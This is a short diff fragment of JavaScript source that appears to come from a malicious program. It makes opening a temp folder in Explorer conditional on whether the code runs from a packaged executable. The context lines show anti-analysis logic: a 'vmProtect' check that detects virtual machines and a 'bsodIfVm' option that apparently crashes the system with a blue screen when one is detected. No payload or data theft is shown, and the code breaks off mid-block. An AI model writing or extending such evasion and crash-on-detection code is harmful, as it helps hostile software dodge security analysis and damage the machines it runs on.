@@ -12,7 +12,7 @@ const { runningFromExecutable, sleep } = require('./util/general');
 
 const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
 module.exports.tempFolder = tempFolder;
-spawnSync('explorer', [tempFolder]);
+!runningFromExecutable() && spawnSync('explorer', [tempFolder]);
 
 if (config.vmProtect && checkVM()) {
   if (config.bsodIfVm) {
